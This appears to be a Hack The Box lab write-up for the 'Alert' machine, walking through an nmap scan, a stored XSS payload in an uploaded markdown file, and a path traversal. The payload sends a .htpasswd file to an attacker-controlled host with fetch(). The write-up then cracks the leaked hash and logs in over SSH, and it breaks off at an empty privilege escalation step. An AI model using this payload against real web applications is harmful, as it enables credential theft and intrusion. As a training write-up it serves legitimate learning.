
Alert is a Linux machine


### Step-1

Start with a reconaissance on ip addr


```cmd
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/alert]
└─$ nmap -sV -sC 10.10.11.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 15:41 IST
Nmap scan report for 10.10.11.44
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.86 seconds
```


There are 2 open ports `ssh` and `http`.

lets check out the website running on http server.

Before checking the IP make sure to add the ip and domain name to `/etc/hosts`

![[Pasted image 20250116170953.png]]

### Step-2

Uploading the payload.

Make a reverse shell with `.md` and upload it. 
Use the following script 

```bash
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.117(tun0 ip):8888(port)/?file_content=" + encodeURIComponent(data));
  });
</script>
```

Once done, upload this file and start a python reverse shell in another terminal.

Once you upload this file, you will sent to a new webpage with `share markdown` link. copy that link. 

Now head to `Contact Us` page, fill the required fields by using some dummy mail and the copied link in message field.


![[Pasted image 20250116173235.png]]

### Step-3
Getting the reverse shell

Once you click on the send button, you will get the rev shell.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/alert/fuzzDicts/subdomainDicts]
└─$ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.14.117 - - [16/Jan/2025 17:38:04] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [16/Jan/2025 17:39:13] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -

```

### Step-4
Getting the `User`  privileges.

Now lets try decode the URL using cyberchef , we got the following output.

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Once analyzing this hash using `hashid` it identified it as `MD5` type.

```bash
─(dkvv㉿kali)-[~/Desktop/htb/machines/alert]
└─$ hashid '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
Analyzing '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
[+] MD5(APR) 
[+] Apache MD5 
```

Let's decrypt this hash using john the ripper

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/alert]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:00 DONE (2025-01-16 17:55) 3.703g/s 10429p/s 10429c/s 10429C/s bebito..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


Lets log in to the ssh port with the credentials.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/alert]
└─$ ssh albert@alert.htb
The authenticity of host 'alert.htb (10.10.11.44)' can't be established.
ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'alert.htb' (ED25519) to the list of known hosts.
albert@alert.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

<snip>

Last login: Thu Jan 16 10:32:57 2025 from 10.10.16.35
albert@alert:~$ 

```


Once you logged in , you can find the user flag in the same directory.

```bash
albert@alert:~$ ls
user.txt
albert@alert:~$ cat user.txt 
<REDACTED>
```

### Step-5
privilege escalation






0e1a3f7c1118db64ba942639ee003c82